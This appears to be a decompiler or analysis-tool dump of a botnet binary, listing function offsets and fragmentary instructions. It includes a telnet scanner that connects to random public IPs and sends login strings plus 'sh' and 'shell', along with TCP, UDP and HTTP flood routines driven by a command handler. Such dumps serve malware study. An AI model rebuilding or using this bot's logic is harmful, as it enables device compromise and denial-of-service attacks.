        if (fdgets(v398, 0x1000, v396) == 0) {
    __libc_close(v396);
        __libc_close(v392);
    __libc_close(v392);
=================FUNCTION : __read_etc_hosts_r ===================
++++++++ FUNCTION START 120814
++++++++ FUNCTION END 121565
++++++++ FUNCTION LENGTH 751
                                        v395 = __open_etc_hosts();
            while (true) {
                while (true) {
                    while (true) {
                            while (true) {
                                        if (inet_pton(2, (char *)v424, 0) > 0) {
                                        while (true) {
                                        fclose((int16_t *)a1);
                                v395 = __open_etc_hosts();
=================FUNCTION : __open_nameservers ===================
++++++++ FUNCTION START 107935
++++++++ FUNCTION END 108533
++++++++ FUNCTION LENGTH 598
    int32_t v391 = fopen((int32_t)"/etc/resolv.conf", (int32_t)&v390); // 0x41352c
        int32_t v397 = fopen((int32_t)"/etc/config/resolv.conf", (int32_t)&v390); // 0x41354c
            while (true) {
                fclose((int16_t *)v393);
            while (true) {
                while (true) {
                        while (true) {
                        while (true) {
    fclose((int16_t *)v393);
=================FUNCTION : _ppfs_parsespec ===================
++++++++ FUNCTION START 55883
++++++++ FUNCTION END 57105
++++++++ FUNCTION LENGTH 1222
    while (true) {
            while (true) {
                while (true) {
                                while (true) {
                                        while (true) {
                                        while (true) {
=================FUNCTION : sendHTTP ===================
++++++++ FUNCTION START 21400
++++++++ FUNCTION END 21834
++++++++ FUNCTION LENGTH 434
    while (true) {
        sprintf(v394, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2);
        if (__libc_fork() != 0) {
            while (true) {
                int32_t v397 = socket_connect(a2, a3); // 0x406568
                    __libc_close(v397);
=================FUNCTION : __GI_memmove ===================
++++++++ FUNCTION START 104072
++++++++ FUNCTION END 104778
++++++++ FUNCTION LENGTH 706
                    case -2: {
                    case -1: {
                        while (true) {
                case -2: {
                case -1: {
                    while (true) {
=================FUNCTION : readUntil ===================
++++++++ FUNCTION START 16745
++++++++ FUNCTION END 17231
++++++++ FUNCTION LENGTH 486
    while (true) {
        while (true) {
                int32_t v401 = __libc_recv(a1, (int32_t *)v400, 1, 0) + a8; // 0x403890
                    int32_t v404 = __libc_recv(a1, (int32_t *)(v400 + 1), 2, 0) + v401; // 0x40391c
                if (strstr(a6, (char *)a2) == 0) {
=================FUNCTION : recvLine ===================
++++++++ FUNCTION START 10847
++++++++ FUNCTION END 11336
++++++++ FUNCTION LENGTH 489
        while (true) {
            Rootsprintf(*(int32_t *)&v400, (int32_t)"PING");
            while (true) {
            while (true) {
    while (true) {
=================FUNCTION : __uClibc_main ===================
++++++++ FUNCTION START 91785
++++++++ FUNCTION END 92517
++++++++ FUNCTION LENGTH 732
    while (true) {
    int32_t v420 = getuid(); // 0x4109d8
    if (v420 == geteuid()) {
        int32_t v421 = getgid(); // 0x410a0c
        if (v421 == getegid()) {
=================FUNCTION : __GI_inet_ntop ===================
++++++++ FUNCTION START 117611
++++++++ FUNCTION END 118353
++++++++ FUNCTION LENGTH 742
            while (true) {
                    while (true) {
                    while (true) {
            while (true) {
    while (true) {
=================FUNCTION : socket_connect ===================
++++++++ FUNCTION START 19926
++++++++ FUNCTION END 20330
++++++++ FUNCTION LENGTH 404
    __GI_gethostbyname(a1);
    int32_t result = socket(); // 0x4048e4
    __GI_setsockopt(result, 6, 1, &v392, 4);
    __libc_connect(result, (struct sockaddr *)&v396, 16);
=================FUNCTION : connectTimeout ===================
++++++++ FUNCTION START 14983
++++++++ FUNCTION END 15426
++++++++ FUNCTION LENGTH 443
    getHost(a2, &v393);
    __libc_connect(a1, (struct sockaddr *)&v392, 16);
        while (true) {
                    getsockopt();
=================FUNCTION : getcwd ===================
++++++++ FUNCTION START 32051
++++++++ FUNCTION END 32653
++++++++ FUNCTION LENGTH 602
        v396 = getcwd(v397, a2);
    int32_t v400 = __GI_getpagesize(); // 0x40ab94
        v396 = getcwd(v397, v400);
    v396 = getcwd(v397, a2);
=================FUNCTION : inet_pton ===================
++++++++ FUNCTION START 116482
++++++++ FUNCTION END 117161
++++++++ FUNCTION LENGTH 679
                    while (true) {
            while (true) {
            while (true) {
    while (true) {
=================FUNCTION : _load_inttype ===================
++++++++ FUNCTION START 100207
++++++++ FUNCTION END 100644
++++++++ FUNCTION LENGTH 437
                case 256: {
                case 512: {
                case 256: {
                case 512: {
=================FUNCTION : negotiate ===================
++++++++ FUNCTION START 15853
++++++++ FUNCTION END 16287
++++++++ FUNCTION LENGTH 434
    __libc_send(a1, (int32_t *)&v394, 1, 0x4000);
    __libc_send(a1, (int32_t *)&v394, 1, 0x4000);
    __libc_send(a1, (int32_t *)(a2 + 2), 1, 0x4000);
=================FUNCTION : __GI_memchr ===================
++++++++ FUNCTION START 103580
++++++++ FUNCTION END 104069
++++++++ FUNCTION LENGTH 489
    while (true) {
    while (true) {
    while (true) {
=================FUNCTION : realloc ===================
++++++++ FUNCTION START 79588
++++++++ FUNCTION END 80062
++++++++ FUNCTION LENGTH 474
        free();
        free();
        __heap_free((int32_t *)v398, v395 + v396, v402 - v395);
=================FUNCTION : listFork ===================
++++++++ FUNCTION START 15429
++++++++ FUNCTION END 15850
++++++++ FUNCTION LENGTH 421
    int32_t result = __libc_fork(); // 0x403034
    while (true) {
    free();
=================FUNCTION : sleep ===================
++++++++ FUNCTION START 88859
++++++++ FUNCTION END 89335
++++++++ FUNCTION LENGTH 476
    if (sigprocmask() == 0) {
                    sigprocmask();
                    sigprocmask();
=================FUNCTION : sendSTD ===================
++++++++ FUNCTION START 20990
++++++++ FUNCTION END 21397
++++++++ FUNCTION LENGTH 407
    socket();
    __GI_gethostbyname(a1);
    rand();
=================FUNCTION : strnlen ===================
++++++++ FUNCTION START 64073
++++++++ FUNCTION END 64563
++++++++ FUNCTION LENGTH 490
    while (true) {
        while (true) {
        while (true) {
=================FUNCTION : strstr ===================
++++++++ FUNCTION START 64566
++++++++ FUNCTION END 65088
++++++++ FUNCTION LENGTH 522
    while (true) {
    while (true) {
        while (true) {
=================FUNCTION : srandom_r ===================
++++++++ FUNCTION START 85157
++++++++ FUNCTION END 85605
++++++++ FUNCTION LENGTH 448
    while (true) {
            __GI_random_r((int32_t *)(8 * v402), v398);
                __GI_random_r((int32_t *)a2, (int32_t)&v404);
=================FUNCTION : initConnection ===================
++++++++ FUNCTION START 26518
++++++++ FUNCTION END 26949
++++++++ FUNCTION LENGTH 431
        __libc_close(v393);
    socket();
    if (connectTimeout(*(int32_t *)&v392, v391, v396, 30) == 0) {
=================FUNCTION : memrchr ===================
++++++++ FUNCTION START 105179
++++++++ FUNCTION END 105665
++++++++ FUNCTION LENGTH 486
    while (true) {
        while (true) {
        while (true) {
=================FUNCTION : __xpg_strerror_r ===================
++++++++ FUNCTION START 65489
++++++++ FUNCTION END 65960
++++++++ FUNCTION LENGTH 471
    while (true) {
        while (true) {
=================FUNCTION : printi ===================
++++++++ FUNCTION START 4850
++++++++ FUNCTION END 5334
++++++++ FUNCTION LENGTH 484
            while (true) {
    while (true) {
=================FUNCTION : _uintmaxtostr ===================
++++++++ FUNCTION START 101066
++++++++ FUNCTION END 101564
++++++++ FUNCTION LENGTH 498
        while (true) {
    while (true) {
=================FUNCTION : __libc_sendto ===================
++++++++ FUNCTION START 74931
++++++++ FUNCTION END 75335
++++++++ FUNCTION LENGTH 404
    int32_t v392 = sendto(sock, message, length, flags, NULL, 0); // 0x40ebe0
    if (flags != 0) {
=================FUNCTION : __GI_strpbrk ===================
++++++++ FUNCTION START 106087
++++++++ FUNCTION END 106531
++++++++ FUNCTION LENGTH 444
    while (true) {
        while (true) {
=================FUNCTION : __raise ===================
++++++++ FUNCTION START 121568
++++++++ FUNCTION END 121963
++++++++ FUNCTION LENGTH 395
    __libc_getpid();
    return kill();
=================FUNCTION : __GI_strncat ===================
++++++++ FUNCTION START 114670
++++++++ FUNCTION END 115150
++++++++ FUNCTION LENGTH 480
    while (true) {
            while (true) {
=================FUNCTION : fclose ===================
++++++++ FUNCTION START 40769
++++++++ FUNCTION END 41218
++++++++ FUNCTION LENGTH 449
        free();
    _stdio_openlist_dec_use();
=================FUNCTION : strncpy ===================
++++++++ FUNCTION START 63588
++++++++ FUNCTION END 64070
++++++++ FUNCTION LENGTH 482
                            while (true) {
    while (true) {
=================FUNCTION : __libc_recv ===================
++++++++ FUNCTION START 74117
++++++++ FUNCTION END 74521
++++++++ FUNCTION LENGTH 404
    int32_t v392 = recv(sock, buf, length, flags); // 0x40eb00
    if (flags != 0) {
=================FUNCTION : __length_dotted ===================
++++++++ FUNCTION START 123697
++++++++ FUNCTION END 124128
++++++++ FUNCTION LENGTH 431
    while (true) {
        while (true) {
=================FUNCTION : _stdio_openlist_dec_use ===================
++++++++ FUNCTION START 58348
++++++++ FUNCTION END 58801
++++++++ FUNCTION LENGTH 453
        while (true) {
                free();
=================FUNCTION : read_with_timeout ===================
++++++++ FUNCTION START 12142
++++++++ FUNCTION END 12553
++++++++ FUNCTION LENGTH 411
    while (true) {
            return __libc_recv(a1, (int32_t *)a3, a4, 0);
=================FUNCTION : inet_aton ===================
++++++++ FUNCTION START 106534
++++++++ FUNCTION END 107018
++++++++ FUNCTION LENGTH 484
    while (true) {
        while (true) {
=================FUNCTION : _stdio_term ===================
++++++++ FUNCTION START 43776
++++++++ FUNCTION END 44217
++++++++ FUNCTION LENGTH 441
    while (true) {
    while (true) {
=================FUNCTION : print ===================
++++++++ FUNCTION START 5337
++++++++ FUNCTION END 5929
++++++++ FUNCTION LENGTH 592
    while (true) {
                        while (true) {
=================FUNCTION : _store_inttype ===================
++++++++ FUNCTION START 100647
++++++++ FUNCTION END 101063
++++++++ FUNCTION LENGTH 416
        case 256: {
        case 2048: {
=================FUNCTION : __GI_initstate_r ===================
++++++++ FUNCTION START 85608
++++++++ FUNCTION END 86039
++++++++ FUNCTION LENGTH 431
        srandom_r((int64_t)a1, a4);
    srandom_r((int64_t)a1, a4);
=================FUNCTION : _stdlib_strto_l ===================
++++++++ FUNCTION START 86836
++++++++ FUNCTION END 88012
++++++++ FUNCTION LENGTH 1176
        case 43: {
        case 45: {
=================FUNCTION : makeRandomStr ===================
++++++++ FUNCTION START 10439
++++++++ FUNCTION END 10844
++++++++ FUNCTION LENGTH 405
    rand_cmwc();
        rand_cmwc();
=================FUNCTION : __GI_strlen ===================
++++++++ FUNCTION START 63127
++++++++ FUNCTION END 63585
++++++++ FUNCTION LENGTH 458
    while (true) {
    while (true) {
=================FUNCTION : contains_string ===================
++++++++ FUNCTION START 14561
++++++++ FUNCTION END 14980
++++++++ FUNCTION LENGTH 419
    while (true) {
        if (strcasestr((char *)a1, v395) != 0) {
=================FUNCTION : matchPrompt ===================
++++++++ FUNCTION START 16290
++++++++ FUNCTION END 16742
++++++++ FUNCTION LENGTH 452
    while (true) {
        while (true) {
=================FUNCTION : __libc_send ===================
++++++++ FUNCTION START 74524
++++++++ FUNCTION END 74928
++++++++ FUNCTION LENGTH 404
    int32_t v392 = send(sock, buf, length, flags); // 0x40eb60
    if (flags != 0) {
=================FUNCTION : __open_etc_hosts ===================
++++++++ FUNCTION START 120405
++++++++ FUNCTION END 120811
++++++++ FUNCTION LENGTH 406
    int32_t v392 = fopen((int32_t)"/etc/hosts", (int32_t)&v391); // 0x41511c
        result = fopen((int32_t)"/etc/config/hosts", (int32_t)&v391);
=================FUNCTION : __GI_fgets_unlocked ===================
++++++++ FUNCTION START 59294
++++++++ FUNCTION END 59753
++++++++ FUNCTION LENGTH 459
    while (true) {
        int32_t v397 = 0x1000000 * getc_unlocked();
=================FUNCTION : Rootsprintf ===================
++++++++ FUNCTION START 6728
++++++++ FUNCTION END 7127
++++++++ FUNCTION LENGTH 399
    int32_t result = __libc_send(a1, v391, __GI_strlen(), 0x4000); // 0x40151c
    free();
=================FUNCTION : rawmemchr ===================
++++++++ FUNCTION START 114206
++++++++ FUNCTION END 114667
++++++++ FUNCTION LENGTH 461
    while (true) {
    while (true) {
=================FUNCTION : abort ===================
++++++++ FUNCTION START 108935
++++++++ FUNCTION END 109509
++++++++ FUNCTION LENGTH 574
            sigprocmask();
        sigprocmask();
=================FUNCTION : _ppfs_init ===================
++++++++ FUNCTION START 54052
++++++++ FUNCTION END 54518
++++++++ FUNCTION LENGTH 466
        while (true) {
    while (true) {
=================FUNCTION : __GI_strchr ===================
++++++++ FUNCTION START 61808
++++++++ FUNCTION END 62295
++++++++ FUNCTION LENGTH 487
    while (true) {
    while (true) {
=================FUNCTION : __GI_setsockopt ===================
++++++++ FUNCTION START 75338
++++++++ FUNCTION END 75742
++++++++ FUNCTION LENGTH 404
    int32_t v392 = setsockopt(sock, level, option_name, option_value, 0); // 0x40ec58
=================FUNCTION : rand ===================
++++++++ FUNCTION START 82289
++++++++ FUNCTION END 82683
++++++++ FUNCTION LENGTH 394
    return random();
=================FUNCTION : getrlimit ===================
++++++++ FUNCTION START 33868
++++++++ FUNCTION END 34273
++++++++ FUNCTION LENGTH 405
    int32_t v392 = getrlimit(); // 0x40ada0
=================FUNCTION : makeIPPacket ===================
++++++++ FUNCTION START 19129
++++++++ FUNCTION END 19525
++++++++ FUNCTION LENGTH 396
    rand_cmwc();
=================FUNCTION : __GI_inet_ntoa ===================
++++++++ FUNCTION START 70823
++++++++ FUNCTION END 71217
++++++++ FUNCTION LENGTH 394
    return inet_ntoa_r((int32_t)&v391);
=================FUNCTION : inet_pton4 ===================
++++++++ FUNCTION START 116004
++++++++ FUNCTION END 116479
++++++++ FUNCTION LENGTH 475
    while (true) {
=================FUNCTION : _promoted_size ===================
++++++++ FUNCTION START 55465
++++++++ FUNCTION END 55880
++++++++ FUNCTION LENGTH 415
    while (true) {
=================FUNCTION : fgets ===================
++++++++ FUNCTION START 57522
++++++++ FUNCTION END 57932
++++++++ FUNCTION LENGTH 410
    int32_t result = __GI_fgets_unlocked((char *)a1, a2, a3); // 0x40d0b8
=================FUNCTION : getegid ===================
++++++++ FUNCTION START 94156
++++++++ FUNCTION END 94561
++++++++ FUNCTION LENGTH 405
    int32_t v392 = getegid(); // 0x410e10
=================FUNCTION : getdtablesize ===================
++++++++ FUNCTION START 32656
++++++++ FUNCTION END 33059
++++++++ FUNCTION LENGTH 403
    if (getrlimit() >= 0) {
=================FUNCTION : kill ===================
++++++++ FUNCTION START 34684
++++++++ FUNCTION END 35089
++++++++ FUNCTION LENGTH 405
    int32_t v392 = kill(); // 0x40ae70
=================FUNCTION : _ppfs_setargs ===================
++++++++ FUNCTION START 54926
++++++++ FUNCTION END 55462
++++++++ FUNCTION LENGTH 536
        while (true) {
=================FUNCTION : __heap_alloc ===================
++++++++ FUNCTION START 80065
++++++++ FUNCTION END 80510
++++++++ FUNCTION LENGTH 445
    while (true) {
=================FUNCTION : geteuid ===================
++++++++ FUNCTION START 94564
++++++++ FUNCTION END 94969
++++++++ FUNCTION LENGTH 405
    int32_t v392 = geteuid(); // 0x410e70
=================FUNCTION : __vfork ===================
++++++++ FUNCTION START 38363
++++++++ FUNCTION END 38757
++++++++ FUNCTION LENGTH 394
    return __libc_fork();
=================FUNCTION : get_telstate_host ===================
++++++++ FUNCTION START 11339
++++++++ FUNCTION END 11734
++++++++ FUNCTION LENGTH 395
    return __GI_inet_ntoa(v392);
=================FUNCTION : __libc_getpid ===================
++++++++ FUNCTION START 33460
++++++++ FUNCTION END 33865
++++++++ FUNCTION LENGTH 405
    int32_t pid = getpid(); // 0x40ad40
=================FUNCTION : getHost ===================
++++++++ FUNCTION START 9632
++++++++ FUNCTION END 10027
++++++++ FUNCTION LENGTH 395
    *a2 = inet_addr(a1);
=================FUNCTION : tcpcsum ===================
++++++++ FUNCTION START 18726
++++++++ FUNCTION END 19126
++++++++ FUNCTION LENGTH 400
    free();
=================FUNCTION : __get_hosts_byname_r ===================
++++++++ FUNCTION START 108536
++++++++ FUNCTION END 108932
++++++++ FUNCTION LENGTH 396
    return __read_etc_hosts_r(0, a1, a2, 0, (int32_t *)a3, a4, a5, a6, a7, v393 + 0x4e950, v392);
=================FUNCTION : inet_ntoa_r ===================
++++++++ FUNCTION START 70406
++++++++ FUNCTION END 70820
++++++++ FUNCTION LENGTH 414
    while (true) {
=================FUNCTION : sprintf ===================
++++++++ FUNCTION START 41618
++++++++ FUNCTION END 42012
++++++++ FUNCTION LENGTH 394
    return __GI_vsnprintf((char *)-1, a1, (int32_t)&a2);
=================FUNCTION : sigprocmask ===================
++++++++ FUNCTION START 37536
++++++++ FUNCTION END 37952
++++++++ FUNCTION LENGTH 416
    int32_t v394 = sigprocmask(); // 0x40b168
=================FUNCTION : _charpad ===================
++++++++ FUNCTION START 44630
++++++++ FUNCTION END 45047
++++++++ FUNCTION LENGTH 417
    while (true) {
=================FUNCTION : __heap_alloc_at ===================
++++++++ FUNCTION START 80513
++++++++ FUNCTION END 80961
++++++++ FUNCTION LENGTH 448
    while (true) {
=================FUNCTION : __decode_dotted ===================
++++++++ FUNCTION START 123231
++++++++ FUNCTION END 123694
++++++++ FUNCTION LENGTH 463
    while (true) {
=================FUNCTION : trim ===================
++++++++ FUNCTION START 3518
++++++++ FUNCTION END 3942
++++++++ FUNCTION LENGTH 424
    while (true) {
=================FUNCTION : __GI_strcoll ===================
++++++++ FUNCTION START 62298
++++++++ FUNCTION END 62714
++++++++ FUNCTION LENGTH 416
    while (true) {
=================FUNCTION : __encode_dotted ===================
++++++++ FUNCTION START 122775
++++++++ FUNCTION END 123228
++++++++ FUNCTION LENGTH 453
    while (true) {
=================FUNCTION : parseHex ===================
++++++++ FUNCTION START 8659
++++++++ FUNCTION END 9074
++++++++ FUNCTION LENGTH 415
    while (true) {
=================FUNCTION : memcpy ===================
++++++++ FUNCTION START 60624
++++++++ FUNCTION END 61277
++++++++ FUNCTION LENGTH 653
        while (true) {
=================FUNCTION : isatty ===================
++++++++ FUNCTION START 68015
++++++++ FUNCTION END 68409
++++++++ FUNCTION LENGTH 394
    return __GI_tcgetattr(&v392) == 0;
=================FUNCTION : srand ===================
++++++++ FUNCTION START 83905
++++++++ FUNCTION END 84304
++++++++ FUNCTION LENGTH 399
    srandom_r((int64_t)a1, *(int32_t *)&v393 - 0x5ed0);
=================FUNCTION : sclose ===================
++++++++ FUNCTION START 19528
++++++++ FUNCTION END 19923
++++++++ FUNCTION LENGTH 395
    __libc_close(a1);
=================FUNCTION : __libc_connect ===================
++++++++ FUNCTION START 72893
++++++++ FUNCTION END 73298
++++++++ FUNCTION LENGTH 405
    int32_t v392 = connect(sock, addr, addr_len); // 0x40e9c0
=================FUNCTION : __GI_gethostbyname ===================
++++++++ FUNCTION START 71624
++++++++ FUNCTION END 72020
++++++++ FUNCTION LENGTH 396
    gethostbyname_r(a1, &v392, (int32_t)&v391, 460, (int32_t)&result, v390);
=================FUNCTION : malloc ===================
++++++++ FUNCTION START 78640
++++++++ FUNCTION END 79117
++++++++ FUNCTION LENGTH 477
            __heap_free((int32_t *)v401, v400, v397);
=================FUNCTION : __GI_strspn ===================
++++++++ FUNCTION START 115153
++++++++ FUNCTION END 115595
++++++++ FUNCTION LENGTH 442
    while (true) {
=================FUNCTION : getuid ===================
++++++++ FUNCTION START 95380
++++++++ FUNCTION END 95785
++++++++ FUNCTION LENGTH 405
    int32_t v392 = getuid(); // 0x410f30
=================FUNCTION : getgid ===================
++++++++ FUNCTION START 94972
++++++++ FUNCTION END 95377
++++++++ FUNCTION LENGTH 405
    int32_t v392 = getgid(); // 0x410ed0
=================FUNCTION : strcasecmp ===================
++++++++ FUNCTION START 66757
++++++++ FUNCTION END 67184
++++++++ FUNCTION LENGTH 427
    while (true) {
=================FUNCTION : wait4 ===================
++++++++ FUNCTION START 96644
++++++++ FUNCTION END 97049
++++++++ FUNCTION LENGTH 405
    int32_t v392 = wait4(); // 0x411080
=================FUNCTION : __libc_fork ===================
++++++++ FUNCTION START 31643
++++++++ FUNCTION END 32048
++++++++ FUNCTION LENGTH 405
    int32_t v392 = fork(); // 0x40aaf0
=================FUNCTION : _stdio_fopen ===================
++++++++ FUNCTION START 42424
++++++++ FUNCTION END 42977
++++++++ FUNCTION LENGTH 553
                                free();
=================FUNCTION : inet_addr ===================
++++++++ FUNCTION START 71220
++++++++ FUNCTION END 71621
++++++++ FUNCTION LENGTH 401
    if (inet_aton((char *)&result) != 0) {
=================FUNCTION : __libc_open ===================
++++++++ FUNCTION START 35092
++++++++ FUNCTION END 35502
++++++++ FUNCTION LENGTH 410
    int32_t fd = open(path, oflag); // 0x40aef4
=================FUNCTION : __GI_wcsnrtombs ===================
++++++++ FUNCTION START 98255
++++++++ FUNCTION END 98752
++++++++ FUNCTION LENGTH 497
        while (true) {
=================FUNCTION : getsockopt ===================
++++++++ FUNCTION START 73709
++++++++ FUNCTION END 74114
++++++++ FUNCTION LENGTH 405
    int32_t v392 = getsockopt(); // 0x40ea98
=================FUNCTION : random ===================
++++++++ FUNCTION START 82686
++++++++ FUNCTION END 83088
++++++++ FUNCTION LENGTH 402
    __GI_random_r((int32_t *)(v394 - 0x5ed0), (int32_t)&result);
=================FUNCTION : strcasestr ===================
++++++++ FUNCTION START 67187
++++++++ FUNCTION END 67615
++++++++ FUNCTION LENGTH 428
    while (true) {
=================FUNCTION : __check_one_fd ===================
++++++++ FUNCTION START 90956
++++++++ FUNCTION END 91364
++++++++ FUNCTION LENGTH 408
    int32_t v392 = __libc_open("/dev/null", a2); // 0x4107c4
=================FUNCTION : __libc_creat ===================
++++++++ FUNCTION START 35505
++++++++ FUNCTION END 35899
++++++++ FUNCTION LENGTH 394
    return __libc_open((char *)769, 769);
=================FUNCTION : GetRandomIP ===================
++++++++ FUNCTION START 17888
++++++++ FUNCTION END 18283
++++++++ FUNCTION LENGTH 395
    return rand_cmwc() & -1 - a1 ^ v392 & a1;
=================FUNCTION : fdgets ===================
++++++++ FUNCTION START 8235
++++++++ FUNCTION END 8656
++++++++ FUNCTION LENGTH 421
    while (true) {
=================FUNCTION : fopen ===================
++++++++ FUNCTION START 41221
++++++++ FUNCTION END 41615
++++++++ FUNCTION LENGTH 394
    return _stdio_fopen(0, (char *)-1);
=================FUNCTION : advance_state ===================
++++++++ FUNCTION START 12556
++++++++ FUNCTION END 12957
++++++++ FUNCTION LENGTH 401
        __libc_close(*a1);
=================FUNCTION : socket ===================
++++++++ FUNCTION START 75745
++++++++ FUNCTION END 76150
++++++++ FUNCTION LENGTH 405
    int32_t v392 = socket(); // 0x40ecc0
=================FUNCTION : free ===================
++++++++ FUNCTION START 79120
++++++++ FUNCTION END 79585
++++++++ FUNCTION LENGTH 465
    int32_t v396 = __heap_free((int32_t *)v394, v392 - 4, v395); // 0x40f184
=================FUNCTION : __stdio_WRITE ===================
++++++++ FUNCTION START 98755
++++++++ FUNCTION END 99224
++++++++ FUNCTION LENGTH 469
        while (true) {
=================FUNCTION : inet_ntop4 ===================
++++++++ FUNCTION START 117164
++++++++ FUNCTION END 117608
++++++++ FUNCTION LENGTH 444
    while (true) {
=================FUNCTION : __GI_getsockname ===================
++++++++ FUNCTION START 73301
++++++++ FUNCTION END 73706
++++++++ FUNCTION LENGTH 405
    int32_t v392 = getsockname(sock, addr, (int32_t *)addr_len); // 0x40ea20
=================FUNCTION : fflush_unlocked ===================
++++++++ FUNCTION START 58804
++++++++ FUNCTION END 59291
++++++++ FUNCTION LENGTH 487
        while (true) {
=================FUNCTION : __libc_waitpid ===================
++++++++ FUNCTION START 38760
++++++++ FUNCTION END 39154
++++++++ FUNCTION LENGTH 394
    return wait4();
=================FUNCTION : __GI_vsnprintf ===================
++++++++ FUNCTION START 42015
++++++++ FUNCTION END 42421
++++++++ FUNCTION LENGTH 406
    int32_t result = _vfprintf_internal(); // 0x40b658
=================FUNCTION : __libc_close ===================
++++++++ FUNCTION START 30827
++++++++ FUNCTION END 31232
++++++++ FUNCTION LENGTH 405
    int32_t v392 = close(fd); // 0x40aa30
=================FUNCTION : prints ===================
++++++++ FUNCTION START 4347
++++++++ FUNCTION END 4847
++++++++ FUNCTION LENGTH 500
        while (true) {
================================================================================
========	WHILE LOOPS INTRESTING INSTRUCTIONS : =================================
================================================================================
=============================WHILE LOOPS ID : 5 @ print ====================================
++++++++ WHILE START : 5737 
++++++++ WHILE FUNCTION : print 
++++++++ WHILE END : 5920 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 6 @ fdpclose ====================================
++++++++ WHILE START : 8159 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 8183 
++++++++ INTRESTING INSTRUCTIONS :  
		int32_t v397 = __libc_waitpid(v395, (int32_t)&v393, 0); // 0x401b50
		sigprocmask();
=============================WHILE LOOPS ID : 7 @ fdpclose ====================================
++++++++ WHILE START : 8196 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 8207 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_waitpid(v395, (int32_t)&v393, 0) == -1) {
		sigprocmask();
=============================WHILE LOOPS ID : 8 @ fdpclose ====================================
++++++++ WHILE START : 8220 
++++++++ WHILE FUNCTION : fdpclose 
++++++++ WHILE END : 8231 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__libc_waitpid(v395, (int32_t)&v393, 0) == -1) {
		sigprocmask();
=============================WHILE LOOPS ID : 11 @ recvLine ====================================
++++++++ WHILE START : 11258 
++++++++ WHILE FUNCTION : recvLine 
++++++++ WHILE END : 11322 
++++++++ INTRESTING INSTRUCTIONS :  
		Rootsprintf(*(int32_t *)&v400, (int32_t)"PING");
		while (true) {
		while (true) {
=============================WHILE LOOPS ID : 13 @ read_with_timeout ====================================
++++++++ WHILE START : 12541 
++++++++ WHILE FUNCTION : read_with_timeout 
++++++++ WHILE END : 12552 
++++++++ INTRESTING INSTRUCTIONS :  
		return __libc_recv(a1, (int32_t *)a3, a4, 0);
=============================WHILE LOOPS ID : 14 @ contains_string ====================================
++++++++ WHILE START : 14963 
++++++++ WHILE FUNCTION : contains_string 
++++++++ WHILE END : 14977 
++++++++ INTRESTING INSTRUCTIONS :  
		if (strcasestr((char *)a1, v395) != 0) {
=============================WHILE LOOPS ID : 15 @ connectTimeout ====================================
++++++++ WHILE START : 15402 
++++++++ WHILE FUNCTION : connectTimeout 
++++++++ WHILE END : 15420 
++++++++ INTRESTING INSTRUCTIONS :  
		getsockopt();
=============================WHILE LOOPS ID : 17 @ matchPrompt ====================================
++++++++ WHILE START : 16686 
++++++++ WHILE FUNCTION : matchPrompt 
++++++++ WHILE END : 16741 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
=============================WHILE LOOPS ID : 18 @ readUntil ====================================
++++++++ WHILE START : 17141 
++++++++ WHILE FUNCTION : readUntil 
++++++++ WHILE END : 17228 
++++++++ INTRESTING INSTRUCTIONS :  
		while (true) {
		int32_t v401 = __libc_recv(a1, (int32_t *)v400, 1, 0) + a8; // 0x403890
		int32_t v404 = __libc_recv(a1, (int32_t *)(v400 + 1), 2, 0) + v401; // 0x40391c
		if (strstr(a6, (char *)a2) == 0) {
=============================WHILE LOOPS ID : 19 @ GetRandomPublicIP ====================================
++++++++ WHILE START : 17634 
++++++++ WHILE FUNCTION : GetRandomPublicIP 
++++++++ WHILE END : 17648 
++++++++ INTRESTING INSTRUCTIONS :  
		rand();
		rand();
		rand();
		rand();
=============================WHILE LOOPS ID : 20 @ StartTheLelz ====================================
++++++++ WHILE START : 20758 
++++++++ WHILE FUNCTION : StartTheLelz 
++++++++ WHILE END : 20983 
++++++++ INTRESTING INSTRUCTIONS :  
		GetRandomPublicIP(v395);
		socket();
		if (__libc_connect(*v416, (struct sockaddr *)&v392, 16) == -1) {
		while (true) {
		if (__libc_send(*v416, (int32_t *)v424, v423, 0x4000) <= 0xffffffff) {
		if (__libc_send(*v416, (int32_t *)"\r\n", 2, 0x4000) <= 0xffffffff) {
		if (__libc_send(*v416, (int32_t *)v426, v425, 0x4000) <= 0xffffffff) {
		if (__libc_send(*v416, (int32_t *)"\r\n", 2, 0x4000) <= 0xffffffff) {
		get_telstate_host(v404);
		Rootsprintf(*(int32_t *)&v428, (int32_t)&v427);
		__libc_send(*v416, (int32_t *)"sh\r\n", 4, 0x4000);
		__libc_send(*v416, (int32_t *)"shell\r\n", 7, 0x4000);
		if (__libc_send(*v416, (int32_t *)v430, v429, 0x4000) <= 0xffffffff) {
=============================WHILE LOOPS ID : 21 @ sendHTTP ====================================
++++++++ WHILE START : 21797 
++++++++ WHILE FUNCTION : sendHTTP 
++++++++ WHILE END : 21833 
++++++++ INTRESTING INSTRUCTIONS :  
		sprintf(v394, (int32_t)"%s %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", a1, a4, a2);
		if (__libc_fork() != 0) {
		while (true) {
		int32_t v397 = socket_connect(a2, a3); // 0x406568
		__libc_close(v397);
=============================WHILE LOOPS ID : 22 @ sendTCP ====================================
++++++++ WHILE START : 22807 
++++++++ WHILE FUNCTION : sendTCP 
++++++++ WHILE END : 22847 
++++++++ INTRESTING INSTRUCTIONS :  
		if (__GI_strcoll(v407, (int32_t)"rst") == 0) {
		if (__GI_strcoll(v407, (int32_t)"psh") == 0) {
		Rootsprintf(*(int32_t *)&v395, (int32_t)"Invalid flag \"%s\"");
=============================WHILE LOOPS ID : 23 @ processCmd ====================================
++++++++ WHILE START : 23523 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23539 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() == 0) {
		sendUDP(v466, v403, v432, v433, v434, 1000, 0xf4240, 0);
=============================WHILE LOOPS ID : 24 @ processCmd ====================================
++++++++ WHILE START : 23560 
++++++++ WHILE FUNCTION : processCmd 
++++++++ WHILE END : 23569 
++++++++ INTRESTING INSTRUCTIONS :  
		if (listFork() != 0) {
